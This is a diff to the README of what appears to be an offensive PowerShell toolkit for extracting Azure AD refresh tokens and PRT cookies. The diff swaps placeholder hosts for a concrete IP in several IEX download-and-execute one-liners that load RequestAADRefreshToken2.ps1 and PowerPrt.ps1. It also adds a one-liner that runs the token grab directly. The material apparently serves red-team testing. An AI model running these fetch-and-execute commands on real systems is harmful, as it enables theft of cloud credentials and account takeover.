@@ -129,9 +129,11 @@ Exposes `Get-AADRefreshToken` with the same arguments as the exe.
 ### Load
 
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString('http://<host>/RequestAADRefreshToken.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.1/RequestAADRefreshToken2.ps1')
 # or
-IEX (iwr http://<host>/RequestAADRefreshToken.ps1 -UseBasicParsing)
+IEX (iwr http://192.168.23.1/RequestAADRefreshToken2.ps1 -UseBasicParsing)
+# one liner
+IEX (iwr http://192.168.23.1/RequestAADRefreshToken2.ps1 -UseBasicParsing); Get-AADRefreshToken
 ```
 
 ### Usage
@@ -157,7 +159,7 @@ Get-AADRefreshToken -Help
 
 ```powershell
 # Step 1 - get cookie
-IEX (iwr http://<host>/RequestAADRefreshToken.ps1 -UseBasicParsing)
+IEX (iwr http://192.168.23.1/RequestAADRefreshToken2.ps1 -UseBasicParsing)
 Get-AADRefreshToken
 
 # Step 2 - exchange cookie for token
@@ -185,9 +187,9 @@ IEX (load PowerPrt.ps1)
 ### Load
 
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString('http://<host>/PowerPrt.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.1/PowerPrt.ps1')
 # or
-IEX (iwr http://<host>/PowerPrt.ps1 -UseBasicParsing)
+IEX (iwr http://192.168.23.1/PowerPrt.ps1 -UseBasicParsing)
 ```
 
 ### Functions
